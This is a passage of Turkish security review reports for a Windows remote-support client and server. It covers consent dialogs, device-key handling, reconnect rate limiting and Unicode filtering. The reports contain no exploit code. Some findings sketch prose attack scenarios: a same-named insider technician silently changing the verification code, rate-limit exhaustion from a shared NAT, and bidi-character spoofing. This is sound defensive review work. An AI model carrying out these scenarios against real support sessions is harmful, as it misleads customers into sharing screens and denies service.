Düzeltme (mimar → backend-dev Go): `rememberPlan` kuralı v2'de aynen korunmalı. "Bilgilerimi unut" (`ClearPersonal`) `deviceKey`'i de yenilemeli. Kayıtla açılan talepte cihaz bayrağı zaten gereksiz, bu yüzden `bindingKey` kullanıldığında `deviceKey` gönderilmemeli (veri en aza indirme).

### [DÜŞÜK] G-E10-6 T43 köken karşılaştırması kanonik olarak tanımlanmamış — A07

Yer: mimari-e10 §8.3 (`server` yalnız `https://` kökeni), §8.4.
Düzeltme (backend-dev Go): `url.Parse` sonrası şema `https`, host küçük harfe çevrilip IDNA ile normalleştirilmiş, port açıkça yazılmış (443 varsayılan), yol/sorgu/kullanıcı bilgisi yok. Karşılaştırma `scheme://host:port` dizesi üzerinden yapılmalı. Tablo testi: büyük harf, sonda nokta, `:443`, `user@host` ve yol içeren varyantlar.

### [DÜŞÜK] G-E10-7 Müşterisiz kod oturumu kaydın müşteri bağını sessizce Genel'e düşürüyor — A04

Yer: mimari-e10 §3.4 Verme (3) `customer_id=:oturumun`.
Sorun: Aynı tenant'ta müşterisiz bir kod oturumu (teknisyen seçim yapmazsa) kaydı müşteri X'ten Genel'e taşır. Bu bir güvenlik açığı değil, yanlış atama riski. Ancak bundan sonra açılan talepler yanlış kapsamla ve rozetle düşer.
Düzeltme (mimar): Oturumun müşterisi NULL ve satır aynı tenant'ınsa mevcut `customer_id` korunmalı (müşteri hâlâ ACTIVE ise). Davranış §3.4'e ve AC-187 notuna yazılmalı.

### [DÜŞÜK] G-E10-8 İndirme 302'sindeki dosya etiketi ref'in müşteri mi Genel mi olduğunu ele veriyor (AC-168 metni)

Yer: mimari-api public `request-download` (302 `NoktaDestek-<sahibin file_label>-<ref>.exe`).
Sorun: Etiketi yalnız ref'i zaten bilen görür; 80 bitlik ref'te tahmin yoluyla öğrenme mümkün değil. Etki ihmal edilebilir, ancak AC-168'deki "anlaşılamaz" ifadesiyle birebir uyuşmuyor.
Düzeltme (proje-yoneticisi/mimar): AC-168'e "ref'i bilmeyen biri için" şerhi eklenmeli. Kod değişikliği gerekmez.

### [DÜŞÜK] G-E10-9 Kayıt yanıtı kaybolursa eski anahtar zaten döndürülmüş oluyor; istemci bir sonraki açılışta kaydı kaybediyor (erişilebilirlik)

Yer: §3.4 Verme (3) yerinde güncelleme. Yanıt kaybolur ve oturum biterse cihazda ölü bir anahtar kalır.
Düzeltme (mimar, isteğe bağlı): Kabul edilen risk olarak §5.5'e not düşülmeli (AC-185 metniyle kurtarılıyor). Sonraki sürümde `prev_key_hash` için 24 saatlik tolerans düşünülebilir. Şimdi gerekmez (basitlik).

## Kontrol edilen ve sorun bulunmayan konular

- **`bindingKey` sızması/çalınması (T39):** 256 bit, sunucuda SHA-256 (rastgele anahtar için yeterli), DPAPI CurrentUser (`%LOCALAPPDATA%`, dolaşımsız). Her oturumda döndürülüyor, `REDACT_PATHS` += `*.bindingKey`, `*.previousKey`. `mask.ts` kara listesindeki `key` kalıbı audit'te ikinci savunma katmanı. URL'de taşınmıyor. Aynı Windows kullanıcısındaki zararlı yazılım riski kabul edilen risk (T39/T47). Etkisi talep açmakla sınırlı.
- **Oturum yetkisi yok (T40, AC-184):** `rs_` ↔ `rsb_` biçim ayrımı. Oturum uçları tabloya bakmıyor; uç başına negatif test planlanmış.
- **`binding.request` koşulları:** ADMITTED (değilse 1008), AGENT, teklif gönderilmiş soket, ACTIVE oturum, aktif tenant/müşteri; oturum başına 3 istek. Müşteri istemciden **alınmıyor**, oturumun `customer_id`'sinden geliyor. Lobi/ret/Vazgeç → `hello` yok → kayıt yok. Tutarlı (G-E10-1 eki hariç).
- **Ref ad alanı / enumeration (T42, T44):** `request_refs` append-only (grant'ta UPDATE/DELETE yok), emekli ref'ler yeniden verilmiyor. Tek 404 ve paralel sorgu, geçersiz ref ile geçersiz kayıt aynı kovada (10/dk/ipKey). 80/256 bitte tahmin mümkün değil.
- **`BINDING_INVALID` tek tip:** Tüm nedenler aynı gövdeyi döndürüyor, neden yalnız metrikte. `revoke` her durumda 204. Geçerli ve geçersiz anahtarların farklı kovalara düşmesi ayırt edicidir, ancak 256 bitte sömürülemez.
- **IDOR (T41):** Tüm panel uçlarında `tenantScope`, Super Admin için `all` yok, bileşik FK `(customer_id, tenant_id)` üç tabloda, `POST /sessions customerId` için tenant+ACTIVE doğrulaması. Detay sekmeleri çift yetki ve `historyScope` istiyor. Liste yanıtında PII yok. Not (backend-dev): `?customer=<id>` filtresi her sorguda `tenant_id` ile birlikte uygulanmalı (AC-69 aracı kapsamalı).
- **Pasife alma / yenileme:** Kayıtlar aynı TX'te `key_hash=NULL` ile düşürülüyor. Kullanım anında da durum kontrolü var. Tenant pasif için servis çağrısı ve 30 sn süpürücü, boşta kalma için günlük iş var.
- **0.9.x uyumu:** `hello` değişmiyor. `binding.offer` sürüm kapılı (beyan edilen sürüm, ama sahte beyan yalnız teklif almayı sağlar, yetki vermez). `CUSTOMER_PASSIVE` → `TENANT_PASSIVE` eşlemesi var. Sunucu geri alındığında istemci kayıt istemiyor.
- **DPAPI v2:** ≤ 4 KB, `DisallowUnknownFields`, anahtar regex, atomik yazma. `ForgetAll` önce yereli siliyor, sonra en iyi çabayla revoke gönderiyor (doğru sıra).
- **KVKK:** Kayıtta PII yok. Müşteri PII'si liste yanıtında yok; pasif + saklama sonunda anonimleştiriliyor; elle boşaltma ve aydınlatma metninin yeni sürümü var. Audit maskesi K19'a bağlı.

## Mimariye işlenecekler (özet)

| #          | Belge / bölüm                                              | Değişiklik                                                              | Sahibi                                 |
| ---------- | ---------------------------------------------------------- | ----------------------------------------------------------------------- | -------------------------------------- |
| G-E10-1    | mimari-e10 §3.4 Verme (2), mimari-api `SupportRequestItem` | Bayat kaynak koşulu, `viaBinding` = etkin kayıt, `bindingRevoked`       | mimar → backend, frontend              |
| G-E10-2    | mimari-api (yeni uç), §3.3 `revoke_reason`, §9, runbook    | `POST /support-requests/:id/revoke-binding`, `ADMIN_REVOKED`            | mimar → dba, backend, frontend, devops |
| G-E10-3    | mimari-e10 §3.3, §3.4                                      | `active_session_id` üretilmiş sütun + UQ, tek etkin kayıt kuralı        | mimar → dba, backend                   |
| K19        | §5.7, `audit/mask.ts`                                      | `customerAuditView` izinli liste + `changed` + dize araması testi       | backend                                |
| K20        | §5.3, §9                                                   | Kalıcı ipucu kalır, rozet kapsamı (firma/Genel), etkin kayıt şartı      | frontend                               |
| G-E10-4..7 | §5.7, §8.3, §8.4, §3.4                                     | REPLACED audit, deviceKey/rememberPlan, kanonik köken, müşteriyi koruma | backend (Go dahil)                     |

## Otomatik tarama çıktıları

Tasarım turu, kod yok; tarama çalıştırılmadı. P8c-1 kod turunda `pnpm audit`, gitleaks/`git grep` ve log yakalama testi (anahtar ve PII yok) yapılacak.

## Tasarımda vaat edilip kodda bulunmayanlar

Uygulanamaz (kod yok). Kod turunda doğrulanacaklar: AC-184 uç başına negatif testler, `REDACT_PATHS` ekleri, K19 dize araması testi, G-E10-1/3 entegrasyon testleri.

## Olumlu

- Kayıt yetkisi dar tutulmuş: yalnız talep açıyor, oturum açamıyor. Teknisyen kabulü ve müşterinin her seferki onayı şart; gözetimsiz erişime yol yok.
- Sunucu üretimli ve her oturumda döndürülen anahtar, yalnız özetin saklanması ve geçersizleşmede özetin silinmesi.
- Kayıt verme kanalı mevcut admit edilmiş sokette; yeni bir REST kimlik yolu açılmamış. Teklif adımı geri almayı güvenli kılıyor.
- Append-only ref ad alanı ile "dosyanın yeni sahibe dirilmesi" sınıfı kapanmış.
- Müşterinin istemciden asla alınmaması ve tenant tutarlılığının bileşik FK ile sağlanması.

Karar: Kritik/Yüksek 0 → **GEÇTİ**. G-E10-1..3 (Orta) mimari-e10 r2'ye işlenmeli. G-E10-4..9 (Düşük) ya P8c-1'de kapatılmalı ya da `docs/gereksinimler.md` §9'a "Sonra" olarak yazılmalı.

---

# Güvenlik Raporu — P8b-2 — Tur 2 — Windows Go istemci 0.9.0 düzeltme doğrulaması (2026-11-12)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1

Kapsam: `docs/implementation.md` "Backend (Go) P8b-2 — düzeltme turu 1" maddeleri (S8b2-1..3, QA-P8b2-1/2, QA öneri 2/3). Değişen dosyalar incelendi: `request/{run,policy,wait,ws,validate,types}.go`, `api/api.go`, `ui/{request,control,screens}_windows.go`, `flow/flow.go`, `cmd/noktadestek/main.go`. Ek olarak sunucuda `request.accepted` üretimine bakıldı (`apps/server/src/requests/panel.ts:102-136`, `ws.ts:86`).

## Tur 1 bulgularının durumu

| #              | Durum                               | Kanıt                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| -------------- | ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S8b2-1 [Orta]  | **Kapandı**                         | Koruma iki katmanlı. (1) Saf karar `rememberPlan` (`request/run.go:262-271`): kutu hatırlanan veriyle işaretli açılmışsa ve normalize ad **veya** telefon farklıysa, müşteri kutuya kendisi dokunmadıkça (`RememberChosen=false`) kayıt yapılmaz. Bu durumda dosya silinir (`run.go:301-303`) ve `deviceKey` gönderilmez (`:309-311`). Müşteri kutuyu kendisi işaretlerse kişi değişince yeni anahtar üretilir (`:304-306`, tek üretim yolu `newKey()`). Başka kişinin cihaz anahtarı taşınmaz. (2) Arayüzde ad/telefon `EN_CHANGE` olunca, müşteri kutuya dokunmamışsa kutu işaretsize çekilir (`ui/request_windows.go:220-227`). Programatik `SetText`, `filling` bayrağıyla müşteri düzenlemesi sayılmaz (`:252-257`). `chosen` yalnız `BN_CLICKED` ile true olur. UI katmanı atlansa bile saf karar korur. Testler: `TestAC136RememberPlan`, `TestAC136ChangedIdentityNotSavedWithoutOptIn`.                                                                                                                                                                                       |
| S8b2-2 [Düşük] | **Kapandı**                         | `dialRetryDelay` (`request/policy.go:99-110`) bekleme aralıklarını 2→4→8→15 sn tavanına kadar artırıyor ve üzerine `crypto/rand` jitter ekliyor. `Retry-After` en az o kadar bekletiyor, en çok 60 sn'ye kırpılıyor. Sonuç kalan bütçeyle sınırlı (`min(d,left)`, negatif değilse). `startDial` (`wait.go:121-156`) her başarısız denemede (429, 503, ağ) bu gecikmeyi uyguluyor. 403/426 kesin hata olarak kalıyor. Bütçe dolunca `errReconnectTimeout` dönüyor (110 sn, sunucunun 120 sn'sinin altında). Tek istemcinin upgrade sayısı 110 sn'de ~30'dan ~10'a indi. Upgrade `Retry-After` değeri `ws.go:196` ile okunuyor. REST ve WS aynı `api.ParseRetryAfter`'ı kullanıyor. Not: Çok büyük bir `Retry-After` değerinde `time.Duration` taşabilir, ama sonuç iki çağıranda da kırpılıyor (`>0` denetimi + 60 sn / 1..15 sn). Kaynak TLS doğrulamalı gömülü sunucu olduğu için bulgu sayılmadı. Sunucu tarafı (güvenilen CIDR'ın `wsUpgrade`'den muaf tutulması) "Sonra"da kalıyor.                                                                                                |
| S8b2-3 [Düşük] | **Kapandı, bir artık var → S8b2-4** | Tek süzgeç `request.Display` (`validate.go:112-125`) kullanılıyor. Satır/paragraf ayırıcıları, CR/LF ve sekme boşluğa çevriliyor. Cc/Cf (bidi U+202A–E, U+2066–9, ZW*), U+034F ve U+180E çıkarılıyor. Süzgeç, doğrulamadan **sonra** ve arayüzden **önce** her yerde uygulanıyor: `tenant.name` (`run.go:202`), `technicianName` (`ws.go:115`, boşsa "Teknisyen"), `request.closed.message` (`ws.go:128`), WS `error.message` (`:140`), REST `fields`/`message` (`run.go:343,359`). Uzunluk denetimi ham değerde yapılıyor, süzme yalnız kısaltıyor. Reddetme yerine süzme seçildi; kaynak güvenilir olduğu için kabul edildi. Farklı teknisyen adıyla gelen yeniden kabulde diyalog `closeDlg` ile kapatılıyor (`finish` geri çağrı yapmıyor, yani istem dışı decline/share yok) ve yeni `consentDlg` açılıyor. Böylece P7 kuralları baştan uygulanıyor: odak "Vazgeç"te, `present` içinde 1,5 sn kilit yeniden başlıyor (`control_windows.go:124-133`), `noKey` var, `userInput` kontrolü var, diyalog imleç dışında açılıyor, `FlashWindow` çalışıyor. P7 onay kuralları korunuyor. |

## Bulgular (öncelik sırasıyla)

### [DÜŞÜK] S8b2-4 Yeniden kabulde diyalog kimliği yalnız teknisyen adıyla karşılaştırılıyor; aynı adlı başka teknisyen doğrulama kodunu kilit yeniden başlamadan değiştirebiliyor — A04 (savunma derinliği)

Yer: `apps/agent-win/internal/ui/request_windows.go:356-360`; sunucu `apps/server/src/requests/panel.ts:102,136` (her kabulde yeni `techVerifyCode`), `ws.ts:86` (yeniden bağlanmada aynı oturumun kodu).
Sorun: Açık onay diyaloğuna aynı `technicianName` ile yeni `request.accepted` gelirse yalnız gövde güncelleniyor. Gövdede **teknisyen doğrulama kodu** da var. Bu durumda 1,5 sn kilit yeniden başlamıyor. Aynı tenant'ta aynı ada sahip iki teknisyen olabilir (ad benzersiz değil; S8b2-3 süzgecinden sonra görsel olarak aynı görünen adlar da buna dahil). İkinci teknisyen talebi yeniden kabul ederse doğrulama kodu müşterinin gözü önünde değişir ve onay düğmesi etkin kalır.
İstismar senaryosu: Müşteri telefondaki teknisyenle kodu karşılaştırmış ve "Ekranımı paylaş"a uzanıyor. Aynı firmada aynı adı taşıyan kötü niyetli ikinci bir teknisyen o sırada talebi yeniden kabul eder. Kod sessizce değişir ve müşteri tıklayınca ekranı ikinci teknisyenle paylaşır. Bunun için tenant içinde yetkili bir iç kişi ve dar bir zamanlama gerekiyor; yeniden kabulün sunucuda yetki ve audit kuralları var. Bu yüzden etki düşük.
Düzeltme (backend-dev, istemci): Diyalog anahtarı `TechName + TechVerifyCode` olmalı. Aynı oturumun yeniden bağlanması aynı kodu getirdiği için (`ws.ts:86`) gövdeyi yerinde güncelleme yolu yalnız gerçek yeniden bağlanmada çalışır. Kod farklıysa diyalog kapatılıp yeniden açılmalı (`reqAcceptTech` → `reqAcceptKey`). Bu davranış Windows elle adımı (c)'ye eklenmeli.

## QA kaynaklı değişikliklerin güvenlik değerlendirmesi (bulgu yok)

- **`ReleaseKind` / 1001** (`wait.go:238-252`, `main.go:131-139`, `flow.go:337-384`): Yalnız `/ws/guest` ağ/protokol hatasında 1001 gönderiliyor, REST iptali yapılmıyor. Müşterinin kararı ve sunucunun son durumu 1000 (decline) olarak gidiyor. 1001 talebi ACCEPTED bırakıyor ve 60 sn sonra sunucu CONNECT_FAILED yazıyor. Oturum açılmadığı için ekran paylaşımı yok, kötüye kullanım yüzeyi de yok. `sync.Once` sayesinde tek sefer çalışıyor. `Failed` yalnız hata yollarında true; kullanıcı vazgeçmesi hata olarak gösterilmiyor. mimari-protokol §5.1 ile tutarlı.
- **`remember` silme hatası** (`run.go:247-255`): `forget()` başarısızlığı artık yutulmuyor. `forgetWarn` başarılı bir silmeye kadar formda ve bekleme ekranında kalıyor; "silindi" yanıltıcı mesajı gösterilmiyor. Silme başarısız olsa da bellekteki `r.rem` temizlendiği için bu gönderimde eski `deviceKey` gönderilmiyor. Uyarı sabit metin; yol veya hata ayrıntısı sızdırmıyor.
- **`remember.NewDeviceKey` kaldırıldı**: Tek rastgelelik yolu `newKey()` (`crypto/rand`, 128 bit).
- **Tab sırası / "Kötüye kullanımı bildir"**: Güvenlik etkisi yok. `OpenMailto` hâlâ yalnız `ValidAbuseEmail`'den geçmiş adresle çağrılıyor.

## Otomatik tarama çıktıları

- `go test ./...` (docker `golang:1.26.11-bookworm@sha256:dc40a1…`, `-mod=readonly`, `GOTOOLCHAIN=local`): **17 paket ok**. `go vet ./...` ve `GOOS=windows go vet ./...`: çıktı yok (temiz).
- Gizli bilgi regex'i: `git grep` (`apps/agent-win`) 0 eşleşme. İzlenmeyen yeni dosyalar (`internal/request`, `internal/remember`, `api/requests.go`, `ui/request_windows.go`) `grep` ile tarandı: 0 eşleşme.
- `go.mod`/`go.sum` değişmedi. Yeni bağımlılık yok.

## Tasarımda vaat edilip kodda bulunmayanlar

- G-E9-13 "kutucuk varsayılan işaretsiz": Kişi değişikliği için açık rıza artık sağlanıyor. Aynı kişi için işaretli açılış Tur 1'de kabul edildi. Ek eksik yok.
- Windows'a özgü doğrulamalar (EN_CHANGE ile kutu düşmesi, kilitli `hatirla.bin`, teknisyen değişiminde diyaloğun yeniden açılması) kodda var ama yalnız elle doğrulanabilir. implementation.md Windows ek adımları (a)–(c) test-operatoru tarafından koşulmalı.

## Olumlu

- S8b2-1 iki katmanlı çözüldü (UI + saf karar). Arayüz atlansa bile başka kişinin verisi rızasız yazılmıyor ve cihaz anahtarı kişiye bağlı.
- Yeniden bağlanma politikası sunucu kovasını koruyor ve bütçeyi aşmıyor. Saf fonksiyon olduğu için testli.
- Sunucu metinleri tek süzgeçten geçiyor. Doğrulama ham değerde, süzme gösterimde yapılıyor.
- Diyalog yeniden açılırken mevcut P7 `consentDlg` yeniden kullanılıyor; yeni bir onay yolu eklenmedi.

Karar: Kritik/Yüksek 0 → **GEÇTİ**. S8b2-4 (Düşük) 0.9.0'da tek satırlık bir düzeltmeyle kapatılabilir. Kapatılmazsa `docs/gereksinimler.md` §9'a "Sonra" olarak yazılmalı.

---

# Güvenlik Raporu — P8b-2 — Tur 1 — Windows Go istemci 0.9.0 (2026-11-12)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 2

Kapsam: `apps/agent-win` çalışma ağacı diff'i (commit edilmemiş): `internal/request/*` (yeni), `internal/remember/*` (yeni), `internal/api/{api,requests}.go`, `internal/pairing`, `internal/flow`, `internal/signal/{strict,messages}.go`, `internal/ui/{request,control,screens}_windows.go`, `internal/win/win_windows.go`, `cmd/noktadestek/main.go`. Bu kod mimari-e9 §13 (G-E9-1..14), ADR-0004 r3, ADR-0006 r4, ADR-0016, mimari-protokol §5 ve P7 onay kurallarıyla karşılaştırıldı. Sunucu tarafına yalnız `/ws/request` upgrade sınırlarını görmek için bakıldı (`apps/server/src/requests/ws.ts`, `limits.ts`).

## Bulgular (öncelik sırasıyla)

### [ORTA] S8b2-1 Hatırlanan veriyle açılışta "hatırla" kutusu işaretli geliyor; başka kişinin verisi onaysız diske yazılabilir (implementation sapma #1) — A04 / KVKK açık rıza

Yer: `apps/agent-win/internal/request/run.go:110` (`Remember: true`), `:266-285` (gönderimde kayıt), `internal/ui/request_windows.go:243`
Sorun: G-E9-13 / AC-136 kutunun varsayılan olarak işaretsiz olmasını istiyor (kullanıcı kararı). Ancak `hatirla.bin` varsa form kutu işaretli açılıyor. Kod, gönderilen ad ve telefonun hatırlanan kişiye ait olup olmadığına bakmıyor. Kayıt (`Save`) her durumda yapılıyor ve önceki kişinin `deviceKey`'i yeniden kullanılıyor.
İstismar senaryosu: Paylaşılan bir Windows hesabında (aile bilgisayarı, ofiste ortak hesap, internet kafe) A daha önce "hatırla" demiş olsun. B formu açar, alanları kendi ad/telefon/e-postasıyla değiştirir ve işaretli kutuyu fark etmez. B'nin kişisel verisi, B hiç seçmeden kalıcı olarak diske yazılır. Sonraki kullanıcı da bu veriyi görür. Sunucu B'nin taleplerini A'nın cihaz anahtarıyla `known_device=true` olarak işaretler. Bu bir yetki ihlali değil, ancak rıza ilkesine ve kullanıcının açık kararına aykırı.
Gerekçenin değerlendirmesi: "İşaretsiz gelseydi her gönderim dosyayı silerdi" itirazı doğru. Bu yüzden düz geri alma yerine aşağıdaki orta yol öneriliyor.
Düzeltme (backend-dev, istemci): Kutu hatırlanan veriyle işaretli açılabilir. Ancak gönderimde normalize edilmiş ad **veya** telefon `r.rem` ile farklıysa ve kullanıcı kutuyu bu oturumda kendisi işaretlememişse, kişi değişmiş sayılmalı:

- kayıt yapılmaz, dosya silinir (AC-137 yolu) ve `deviceKey` gönderilmez;
- ya da kişi değişikliği algılanınca kutu işaretsize çekilir ve "Bu bilgisayarda hatırlansın mı?" yeniden sorulur. Alternatif: ad/telefon alanında `EN_CHANGE` olunca kutu işaretsize çekilir.
  Ayrıca: Kişi değiştiğinde yeni `deviceKey` üretilmesi tercih edilir. Test: `TestAC136ChangedIdentityNotSavedWithoutOptIn`. Kılavuza da bir cümle eklenmeli.

### [DÜŞÜK] S8b2-2 `/ws/request` yeniden bağlanma döngüsü 429'u kalıcı saymıyor ve sabit 2 sn aralıkla deniyor; NAT arkasında ortak IP kovası tükeniyor — A04 (S8b-8 istemci tarafı)

Yer: `apps/agent-win/internal/request/wait.go:118-151` (`startDial`; yalnız 403/426 kesin hata), `run.go:97-98` (`ReconnectEvery` 2 sn). Sunucu: `apps/server/src/requests/limits.ts:77` (`wsUpgrade` 31/dk/ipKey, blok 1 dk), `ws.ts:59,76` (güvenilen CIDR yalnız `ip_sockets`'ten muaf, `wsUpgrade`'den değil).
Sorun: Tek istemci 110 sn boyunca dakikada yaklaşık 30 upgrade deniyor. Bu sayı tek başına sınırın (31) hemen altında. Aynı genel IP arkasında iki veya daha fazla bekleyen müşteri varsa (kurumsal NAT, US-29) sunucu yeniden başladıktan sonra hepsi birlikte 429 bloğuna girer. İstemciler blok sırasında da 2 sn'de bir denemeye devam eder. 110 sn dolunca "Sunucuyla bağlantı kesildi" görünür ve talep sunucuda 120 sn'de `DISCONNECTED` ile iptal olur. `Retry-After` ve jitter yalnız POST create'te kullanılıyor; WS dial'de kullanılmıyor.
İstismar senaryosu: Saldırgan, hedef ofisle aynı NAT'tan (ör. misafir Wi-Fi) dakikada 31 upgrade göndererek ofisin bekleyen taleplerinin yeniden bağlanmasını 1 dk engeller. Kopma süresi 120 sn olduğu için iki blok penceresi talepleri iptal ettirebilir. Etki yalnız kullanılabilirlik.
Düzeltme (backend-dev, istemci): Dial 429'da üstel geri çekilme uygulanmalı: 2→4→8→15 sn, artı 0..1 sn `crypto/rand` jitter. Upgrade yanıtında `Retry-After` varsa ona uyulmalı. Normal yeniden bağlanma aralığına da jitter eklenmeli. Sunucu tarafında güvenilen CIDR'ın `wsUpgrade` kovasından da muaf tutulması değerlendirilmeli (backend-dev, "Sonra").

### [DÜŞÜK] S8b2-3 Sunucudan gelen görünen metinlerde Unicode biçim/bidi karakterleri istemcide süzülmüyor; yeniden kabulde başlık güncellenmiyor — A03 (savunma derinliği)

Yer: `apps/agent-win/internal/request/ws.go:109` (`technicianName` yalnız uzunluk denetimi), `run.go:197-228` (`tenant.name` denetimsiz; pencere başlığı ve büyük etiket), `ui/request_windows.go:335-338` (açık diyalogda yeni `request.accepted` gelirse yalnız gövde güncelleniyor, `<Teknisyen> bağlanmak istiyor` başlığı güncellenmiyor).
Sorun: Firma adı ve teknisyen adı, kullanıcının "kime bağlanıyorum" kararının temelidir. U+202E (RLO) ve benzeri `Cf` karakterleri statik metinde görünümü değiştirebilir. Kaynak TLS doğrulamalı gömülü sunucudur ve yazan kişi tenant yöneticisidir. Bu nedenle risk düşük. Yine de istemcinin hatırlama dosyası için uyguladığı `hasControl` kuralı bu alanlara uygulanmıyor.
Düzeltme (backend-dev, istemci): `tenant.name`, `technicianName`, `request.closed.message` ve hata `fields`/`message` metinleri için `Cc/Cf` içeren değer reddedilmeli (ws: 1008, REST: `BAD_RESPONSE` → ağ hatası ekranı) veya bu karakterler çıkarılmalı. Ayrıca `RequestAccepted` yeniden çağrıldığında teknisyen adı farklıysa diyalog kapatılıp yeniden açılmalı (1,5 sn kilit yeniden başlar). Sunucu şemalarında aynı kural yoksa backend'e de eklenmeli.

## Odak maddelerinin doğrulaması (bulgu yok)

- **OpenURL / 426 indirme bağlantısı:** URL, sunucu yanıtından gelmiyor. `DownloadURL` (`policy.go:78-84`) yalnız gömülü `cfg.ServerURL`'in https kökü, sabit yol ve `^[a-z2-7]{16}$` ile doğrulanmış ref'ten oluşuyor. `win.OpenURL` (`win_windows.go:568`) ikinci kez yalnız `https://` kabul ediyor ve boşluk, tırnak, CR/LF içeren değeri reddediyor. 426 yanıtı (REST `CLIENT_OUTDATED` veya WS upgrade) yalnız yerel engel ekranını tetikliyor. Kod modunda indirme düğmesi yok (`flow/messages.go` msgOutdated). `minAgentVersion` biçim dışıysa yanlış alarm verilmiyor.
- **"Kötüye kullanımı bildir":** `OpenMailto` yalnız `api.ValidAbuseEmail` kuralından geçmiş adresle çağrılıyor (`run.go:198`).
- **Sunucu metinleri UI'da:** Tüm metinler `STATIC` + `SS_NOPREFIX` (`form_windows.go:310`) ile gösteriliyor. Aydınlatma metni salt okunur EDIT içinde. Ret mesajı ≤ 200 UTF-16 ve yalnız `REJECTED` ile birlikte kabul ediliyor, bağlantıya çevrilmiyor (G-E9-12 istemci tarafı tamam). Logo şu an `null`. Gelirse P6 `LogoURL`/`DecodeLogo` kuralları (aynı köken, PNG/JPG sihirli bayt, ≤ 2 MB, yönlendirme yok) uygulanıyor.
- **`/ws/request` sırrı (protokol §5):** Sır yalnız `Sec-WebSocket-Protocol` (`rs.req.<sır>`) ile gidiyor. URL'de sorgu dizesi ve Origin yok (`ws.go:179-183`). Dial öncesi `^[A-Za-z0-9_-]{43}$` ile doğrulanıyor. Hata metinleri sır içermiyor ("upgrade reddedildi"). Ajan kodunda log çağrısı yok (`log`/`slog`/`Printf` 0). Sır diske yazılmıyor (`remember.Data` alanlarında yok). Yönlendirme ile sır sızıntısı da yok: `coder/websocket` `CheckRedirect`'i zincirliyor ve istemcinin `http.ErrUseLastResponse`'u (`api.go:87`) korunuyor (modül kaynağı `dial.go:88-102` ile doğrulandı).
- **TLS:** Sistem kökleri ve `MinVersion` TLS 1.2 kullanılıyor; `InsecureSkipVerify` 0. Talep, WS ve logo aynı `http.Client`'ı paylaşıyor. Sertifika hatası ayrı mesajla gösteriliyor ve doğrulama gevşetilmiyor.
- **DPAPI / dosya:** `CryptProtectData` CurrentUser kapsamında (LOCAL_MACHINE bayrağı yok), `UI_FORBIDDEN` ve sabit entropi ile çağrılıyor. `FOLDERID_LocalAppData\NoktaDestek\hatirla.bin` kullanılıyor (Roaming değil). Düz metin ≤ 4 KB, mühürlü ≤ 16 KB. `DisallowUnknownFields` ve alan doğrulaması var; bozuk veya başka kullanıcıya ait dosya sessizce siliniyor. tmp dosyası `O_EXCL` ile açılıyor; varsa bir kez silinip yeniden deneniyor (G-E9-13), ardından rename ediliyor. "Unut" işlemi dosyayı, tmp'yi ve klasörü (yalnız boşsa) siliyor. ACL `%LOCALAPPDATA%`'dan miras kalıyor (kullanıcı + SYSTEM + Administrators); `0o600` Windows'ta etkisiz ama gereksiz de değil. Açıklama, onay, sır ve ref yazılmıyor.
- **Rastgelelik:** `deviceKey`, `clientInstanceId` ve jitter `crypto/rand` ile üretiliyor (128 bit). `deviceKey` yalnız kutu işaretliyken üretiliyor ve gönderiliyor; işaretsiz gönderimde dosya ile birlikte siliniyor (G-E9-1 / ADR-0004 r3 eki).
- **Yeniden deneme (S8b-8 istemci tarafı):** Create isteği yalnız 503 + `NOT_READY` durumunda tekrarlanıyor: en çok 2 deneme, `Retry-After` 1..15 sn'ye kırpılıyor, üzerine jitter ekleniyor. Ağ hatası ve 502/504 tekrarlanmıyor (çift talep veya kota tüketimi olmasın diye; doğru karar). GET tenant en çok 3 deneme yapıyor. S8b-8'in istemci yarısı karşılandı; sunucu yarısı (kova iadesi) "Sonra"da açık.
- **Kapanış kodları ve durum makinesi:** `CANCELLING` durumunda geç gelen `request.accepted` yok sayılıyor ve `request.decline` gönderiliyor (§13.3 yarışı). Pencere kapatma önce mesaj, sonra 1000 gönderiyor. Bilet süresi dolunca 1001 ile kapanıyor (vazgeçme değil, CONNECT_FAILED). `/ws/request` `/ws/guest` `hello`'su gelene kadar açık kalıyor; `Release` bir kez çalışıyor. Sözleşme dışı mesajda 1008 gönderiliyor ve yeniden bağlanılmıyor; 4409'da da yeniden bağlanılmıyor. Giden mesajlar yalnız iki sabit tipten oluşuyor (`Encode`). Sunucu durumunu kötüye kullanacak bir istemci davranışı bulunmadı.
- **Onay ("Ekranımı paylaş / Vazgeç") ve P7 kuralları:** Ortak `consentDlg` kullanılıyor. Odak "Vazgeç"te. Enter/Space `noKey` ile engelleniyor. 1,5 sn kilit var ve `present` ile yeniden başlıyor. `tryGrant` yalnız yerel donanım girdisini kabul ediyor (`userInput`); enjekte tıklamada kırmızı uyarı çıkıyor ve kilit yeniden başlıyor. Diyalog imleç dışında açılıyor ve `FlashWindow` kullanılıyor. Otomatik onay veya geri sayımla onay yok. Erişim tuşu (`&E`) P7 "&İzin ver" ile aynı model (TrigAccessKey kuralları geçerli). Yeniden bağlanmada gelen yeni ticket kilidi atlatmıyor. Kontrol izni `RunTicket` sonrası P7 yolundan değişmeden alınıyor (AC-156).
- **Dosya adı (ADR-0006 r4):** `RefFromFileName` anchored ifade kullanıyor: label `[A-Za-z0-9]{1,20}`, ref base32 16. Yol ayırıcıları `\` ve `/`'den kesiliyor. Label hiçbir yerde gösterilmiyor (G-E9-11); pencere yalnız sunucudan gelen firma adını gösteriyor. Firma ve kod biçimleri ayrık (`TestAC161FileNameModesAreDisjoint`).
- **DLL arama sırası:** Yeni kod yalnız `x/sys/windows` (crypt32, shell32 → `NewLazySystemDLL`) ve mevcut `shell32` (`NewLazySystemDLL`) kullanıyor. `NewLazyDLL`/`LoadLibrary` eklenmedi. `dllsafe.Harden()` hâlâ `main.go:51`'de, ilk iş olarak çağrılıyor.

## implementation.md "Backend (Go) P8b-2" sapmalarının değerlendirmesi

| #   | Karar                                                                                                       |
| --- | ----------------------------------------------------------------------------------------------------------- |
